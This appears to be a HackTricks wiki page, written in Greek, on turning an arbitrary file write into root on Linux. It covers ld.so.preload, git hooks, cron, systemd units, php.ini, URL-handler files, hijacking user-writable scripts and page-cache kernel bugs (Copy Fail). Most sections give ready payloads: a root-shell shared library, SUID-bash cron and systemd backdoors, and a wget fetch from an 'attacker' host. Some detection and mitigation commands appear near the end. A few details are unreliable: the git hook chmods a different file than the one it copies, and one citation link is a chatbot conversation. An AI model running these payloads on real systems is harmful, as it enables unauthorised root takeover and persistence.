# Αυθαίρετη Εγγραφή Αρχείου ως root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Αυτό το αρχείο συμπεριφέρεται όπως η μεταβλητή περιβάλλοντος **`LD_PRELOAD`**, αλλά λειτουργεί επίσης σε **SUID binaries**.\
Αν μπορείς να το δημιουργήσεις ή να το τροποποιήσεις, μπορείς απλώς να προσθέσεις μια **διαδρομή προς μια library που θα φορτώνεται** με κάθε εκτελούμενο binary.

Για παράδειγμα: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) είναι **scripts** που **εκτελούνται** σε διάφορα **events** σε ένα git repository όπως όταν δημιουργείται ένα commit, ένα merge... Άρα αν ένα **privileged script ή user** εκτελεί αυτές τις ενέργειες συχνά και είναι δυνατό να **γράψεις στον φάκελο `.git`**, αυτό μπορεί να χρησιμοποιηθεί για **privesc**.

Για παράδειγμα, είναι δυνατό να **δημιουργήσεις ένα script** σε ένα git repo μέσα στο **`.git/hooks`** ώστε να εκτελείται πάντα όταν δημιουργείται ένα νέο commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

Αν μπορείς να **γράφεις αρχεία σχετικά με το cron που εκτελεί το root**, συνήθως μπορείς να αποκτήσεις code execution την επόμενη φορά που θα τρέξει το job. Ενδιαφέροντες στόχοι περιλαμβάνουν:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Το δικό του crontab του root στο `/var/spool/cron/` ή `/var/spool/cron/crontabs/`
- `systemd` timers και τις υπηρεσίες που ενεργοποιούν

Γρήγοροι έλεγχοι:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Τυπικές διαδρομές κατάχρησης:

- **Πρόσθεσε ένα νέο root cron job** στο `/etc/crontab` ή σε ένα αρχείο στο `/etc/cron.d/`
- **Αντικατάστησε ένα script** που ήδη εκτελείται από το `run-parts`
- **Βάλε backdoor σε έναν υπάρχοντα timer target** τροποποιώντας το script ή το binary που εκκινεί

Παράδειγμα ελάχιστου cron payload:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Αν μπορείς να γράψεις μόνο μέσα σε έναν cron directory που χρησιμοποιείται από το `run-parts`, τότε βάλε εκεί ένα εκτελέσιμο αρχείο αντί:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Σημειώσεις:

- Το `run-parts` συνήθως αγνοεί filenames που περιέχουν τελείες, οπότε προτίμησε ονόματα όπως `backup` αντί για `backup.sh`.
- Κάποιες distros χρησιμοποιούν `anacron` ή `systemd` timers αντί για κλασικό cron, αλλά η ιδέα της κατάχρησης είναι η ίδια: **τροποποίησε αυτό που θα εκτελέσει αργότερα ο root**.

### Service & Socket files

Αν μπορείς να γράψεις **`systemd` unit files** ή files στα οποία αναφέρονται, ίσως μπορέσεις να πετύχεις code execution ως root κάνοντας reload και restart το unit, ή περιμένοντας να ενεργοποιηθεί το service/socket activation path.

Ενδιαφέροντες στόχοι περιλαμβάνουν:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides στο `/etc/systemd/system/<unit>.d/*.conf`
- Service scripts/binaries στα οποία αναφέρονται τα `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Writable `EnvironmentFile=` paths που φορτώνονται από ένα root service

Γρήγοροι έλεγχοι:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Συνήθεις διαδρομές κατάχρησης:

- **Αντικατάσταση του `ExecStart=`** σε ένα root-owned service unit που μπορείς να τροποποιήσεις
- **Προσθήκη ενός drop-in override** με ένα κακόβουλο `ExecStart=` και πρώτα διαγραφή του παλιού
- **Backdoor του script/binary** που ήδη αναφέρεται από το unit
- **Hijack ενός socket-activated service** τροποποιώντας το αντίστοιχο `.service` αρχείο που ξεκινά όταν το socket λαμβάνει μια σύνδεση

Παράδειγμα κακόβουλου override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Τυπική ροή ενεργοποίησης:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Αν δεν μπορείτε να κάνετε restart services μόνοι σας αλλά μπορείτε να επεξεργαστείτε ένα socket-activated unit, ίσως χρειάζεται μόνο να **περιμένετε σύνδεση client** για να ενεργοποιηθεί η εκτέλεση του backdoored service ως root.

### Overwrite ένα restrictive `php.ini` που χρησιμοποιείται από ένα privileged PHP sandbox

Κάποια custom daemons επικυρώνουν user-supplied PHP εκτελώντας `php` με ένα **restricted `php.ini`** (για παράδειγμα, `disable_functions=exec,system,...`). Αν το sandboxed code εξακολουθεί να έχει **οποιοδήποτε write primitive** (όπως `file_put_contents`) και μπορείτε να φτάσετε το **ακριβές `php.ini` path** που χρησιμοποιεί το daemon, μπορείτε να **overwrite αυτό το config** για να άρετε τους περιορισμούς και μετά να υποβάλετε ένα δεύτερο payload που εκτελείται με elevated privileges.

Τυπική ροή:

1. Πρώτο payload overwrites το sandbox config.
2. Δεύτερο payload εκτελεί code τώρα που οι dangerous functions έχουν re-enabled.

Minimal example (αντικαταστήστε το path που χρησιμοποιεί το daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Αν το daemon εκτελείται ως root (ή κάνει validation με root-owned paths), η δεύτερη εκτέλεση δίνει context root. Αυτό είναι ουσιαστικά **privilege escalation via config overwrite** όταν το sandboxed runtime μπορεί ακόμα να γράφει αρχεία.

### binfmt_misc

Το αρχείο που βρίσκεται στο `/proc/sys/fs/binfmt_misc` δείχνει ποιο binary πρέπει να εκτελεί ποιο τύπο αρχείων. TODO: check the requirements to abuse this to execute a rev shell when a common file type is open.

### Overwrite schema handlers (like http: or https:)

Ένας attacker με δικαιώματα εγγραφής στους configuration directories του victim μπορεί εύκολα να αντικαταστήσει ή να δημιουργήσει αρχεία που αλλάζουν τη συμπεριφορά του συστήματος, με αποτέλεσμα unintended code execution. Με την τροποποίηση του αρχείου `$HOME/.config/mimeapps.list` ώστε τα HTTP και HTTPS URL handlers να δείχνουν σε ένα malicious αρχείο (π.χ. ορίζοντας `x-scheme-handler/http=evil.desktop`), ο attacker διασφαλίζει ότι **κάθε click σε http ή https link ενεργοποιεί code που καθορίζεται σε αυτό το `evil.desktop` αρχείο**. Για παράδειγμα, αφού τοποθετηθεί το παρακάτω malicious code στο `evil.desktop` μέσα στο `$HOME/.local/share/applications`, κάθε external URL click εκτελεί την embedded command:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Για περισσότερες πληροφορίες δείτε [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) όπου χρησιμοποιήθηκε για την εκμετάλλευση ενός πραγματικού ευάλωτου σημείου.

### Root εκτελεί scripts/binaries με δικαίωμα εγγραφής από τον χρήστη

Αν μια privileged workflow εκτελεί κάτι όπως `/bin/sh /home/username/.../script` (ή οποιοδήποτε binary μέσα σε έναν κατάλογο που ανήκει σε unprivileged user), μπορείτε να το hijack:

- **Detect the execution:** monitor processes with [pspy](https://github.com/DominicBreuker/pspy) to catch root invoking user-controlled paths:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Επιβεβαίωση εγγράψιμου:** βεβαιώστε ότι τόσο το αρχείο-στόχος όσο και ο κατάλογός του ανήκουν στον χρήστη σας και είναι writable.
- **Hijack the στόχο:** κάντε backup το original binary/script και ρίξτε ένα payload που δημιουργεί ένα SUID shell (ή οποιαδήποτε άλλη root ενέργεια), και μετά επαναφέρετε τα permissions:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Ενεργοποίησε την privileged action** (π.χ., πάτησε ένα UI button που εκκινεί το helper). Όταν το root re-executes το hijacked path, πάρε το escalated shell με `./rootshell -p`.

### Page-cache-only file modification of privileged binaries

Ορισμένα kernel bugs δεν τροποποιούν το αρχείο **στο disk**. Αντίθετα, σου επιτρέπουν να τροποποιήσεις μόνο το **page cache copy** ενός readable αρχείου. Αν μπορείς να στοχεύσεις ένα **setuid** ή γενικά ένα **root-executed** binary, η επόμενη εκτέλεση μπορεί να τρέξει attacker-controlled bytes από τη μνήμη και να κάνει escalate privileges, παρότι το file hash στο disk παραμένει αμετάβλητο.

Αυτό είναι χρήσιμο να το σκέφτεσαι ως ένα **runtime-only file write primitive**:

- **Το disk μένει καθαρό**: το inode και τα on-disk bytes δεν αλλάζουν
- **Η μνήμη είναι dirty**: τα processes που διαβάζουν/εκτελούν το cached page παίρνουν το attacker-modified περιεχόμενο
- **Το effect είναι προσωρινό**: η αλλαγή εξαφανίζεται μετά από reboot ή cache eviction

Αυτό το primitive βρίσκεται ανάμεσα στο κλασικό **arbitrary file write** και σε παλαιότερα **page-cache abuse** bugs όπως Dirty COW / Dirty Pipe:

- Το Dirty COW βασιζόταν σε race
- Το Dirty Pipe είχε περιορισμούς στη write-position
- Ένα page-cache-only primitive μπορεί να είναι πιο reliable αν το vulnerable path δίνει direct writes σε cached file-backed pages

#### Generic privesc flow

1. Πάρε ένα kernel primitive που μπορεί να γράψει σε **file-backed page cache pages**
2. Χρησιμοποίησέ το σε ένα **readable privileged binary** ή σε άλλο root-executed αρχείο
3. Trigger execution **πριν** το page evicted από το cache
4. Πάρε code execution ως root ενώ το on-disk αρχείο εξακολουθεί να φαίνεται unmodified

Τυπικοί high-value targets:

- **setuid-root** binaries
- Helpers που ξεκινούν από **root services**
- Binaries που εκτελούνται συχνά από **containers που μοιράζονται το host kernel/page cache**

#### AF_ALG + `splice()` example path

Το Copy Fail (CVE-2026-31431) είναι ένα καλό παράδειγμα αυτής της κλάσης. Το vulnerable path ήταν στο Linux crypto userspace API (`AF_ALG` / `algif_aead`):

- το `splice()` μπορεί να μετακινήσει references σε page-cache pages από ένα readable αρχείο μέσα στο crypto TX scatterlist
- το in-place `algif_aead` decrypt path επαναχρησιμοποίησε source και destination buffers
- το `authencesn` έγραψε μετά στο destination tag region
- όταν εκείνο το region εξακολουθούσε να αναφέρεται σε spliced file-backed pages, η εγγραφή κατέληγε στο **page cache του target file**

Άρα η ενδιαφέρουσα τεχνική δεν είναι το ίδιο το CVE, αλλά το pattern:

- **feed file-backed cache pages into a kernel subsystem**
- κάνε το subsystem να τα **θεωρήσει writable output**
- trigger ένα μικρό ελεγχόμενο overwrite στη μνήμη

Το public PoC χρησιμοποίησε επαναλαμβανόμενα **4-byte writes** για να patchάρει το `/usr/bin/su` στη μνήμη και μετά το εκτέλεσε.

#### Exposure and hunting

Αν υποψιάζεσαι αυτή την κλάση bug, μην βασιστείς μόνο σε disk integrity checks. Επίσης verify:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`: το `algif_aead` μπορεί να φορτώνεται/αποφορτώνεται ως module
- `CONFIG_CRYPTO_USER_API_AEAD=y`: το interface είναι ενσωματωμένο στον kernel
- τα setuid binaries είναι καλές επιλογές γιατί ένα page-cache-only patch μπορεί να είναι αρκετό για να μετατρέψει ένα local foothold σε root

#### Attack-surface reduction for the `algif_aead` path

Αν το vulnerable interface παρέχεται από ένα loadable module:
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Αν έχει γίνει compile μέσα στον kernel, ορισμένα disclosures ανέφεραν ότι μπλοκάρουν το init path με:
```bash
initcall_blacklist=algif_aead_init
```
Αυτού του είδους η μετρίαση αξίζει να τη θυμάστε και για άλλα kernel LPEs: αν η εκμετάλλευση εξαρτάται από ένα συγκεκριμένο προαιρετικό interface, η απενεργοποίηση ή το blacklisting αυτού του interface μπορεί να σπάσει το exploit path ακόμη και πριν είναι διαθέσιμο ένα πλήρες kernel upgrade.

## References

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [Openwall oss-security disclosure for CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [Linux stable fix: crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [Copy Fail advisory](https://copy.fail/)
- [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)

{{#include ../../banners/hacktricks-training.md}}
